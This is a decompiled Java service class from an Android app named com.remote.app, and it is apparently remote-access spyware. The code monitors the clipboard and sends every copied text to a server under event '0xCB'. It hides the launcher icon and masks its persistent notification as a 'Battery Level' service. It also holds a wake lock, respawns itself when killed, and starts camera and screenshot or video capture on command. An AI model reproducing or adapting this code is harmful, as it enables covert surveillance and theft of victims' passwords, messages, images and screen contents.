package com.remote.app;

import a.e;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import e.h;
import org.json.JSONException;
import org.json.JSONObject;

public class MainService extends Service {

    /* renamed from: a  reason: collision with root package name */
    private static Context f213a;

    /* renamed from: b  reason: collision with root package name */
    private static PowerManager.WakeLock f214b;

    class a implements ClipboardManager.OnPrimaryClipChangedListener {
        a() {
        }

        public void onPrimaryClipChanged() {
            CharSequence text;
            ClipboardManager clipboardManager = (ClipboardManager) MainService.this.getSystemService("clipboard");
            if (clipboardManager.hasPrimaryClip()) {
                ClipData primaryClip = clipboardManager.getPrimaryClip();
                if (primaryClip.getItemCount() > 0 && (text = primaryClip.getItemAt(0).getText()) != null) {
                    try {
                        JSONObject jSONObject = new JSONObject();
                        jSONObject.put("text", text);
                        h.a(AppClass.f202a).b().a("0xCB", jSONObject);
                    } catch (JSONException e2) {
                        e2.printStackTrace();
                    }
                }
            }
        }
    }

    public static Context a() {
        return f213a;
    }

    private void b() {
        NotificationChannel notificationChannel = new NotificationChannel("example.permanence", "Battery Level Service", 0);
        notificationChannel.setLightColor(-16776961);
        notificationChannel.setLockscreenVisibility(1);
        ((NotificationManager) getSystemService("notification")).createNotificationChannel(notificationChannel);
        startForeground(1, new e.b(this, "example.permanence").g(true).e("Battery Level").h(5).d("service").a());
    }

    public void c() {
        Intent intent = new Intent(getApplicationContext(), CameraActivity.class);
        intent.setFlags(268468224);
        intent.putExtra("camValue", 1);
        startActivity(intent);
    }

    public void d() {
        Intent intent = new Intent(getApplicationContext(), CameraActivity.class);
        intent.setFlags(268468224);
        intent.putExtra("camValue", 0);
        startActivity(intent);
    }

    public void e(int i2, int i3) {
        Intent intent = new Intent(getApplicationContext(), ScreenShotActivity.class);
        intent.addFlags(268435456);
        intent.putExtra("isScreenShot", i2);
        intent.putExtra("videoTime", i3);
        startActivity(intent);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        PowerManager.WakeLock newWakeLock = ((PowerManager) getSystemService("power")).newWakeLock(1, "MyApp::MyWakelockTag");
        f214b = newWakeLock;
        newWakeLock.acquire();
        getPackageManager().setComponentEnabledSetting(new ComponentName(this, MainActivity.class), 2, 1);
        if (Build.VERSION.SDK_INT > 26) {
            b();
            return;
        }
        Notification notification = new Notification();
        notification.priority = 2;
        startForeground(1, notification);
    }

    public void onDestroy() {
        super.onDestroy();
        f214b.release();
        sendBroadcast(new Intent("respawnService"));
    }

    public int onStartCommand(Intent intent, int i2, int i3) {
        super.onStartCommand(intent, i2, i3);
        ((ClipboardManager) getSystemService("clipboard")).addPrimaryClipChangedListener(new a());
        f213a = this;
        e.e.n(this);
        return 1;
    }
}
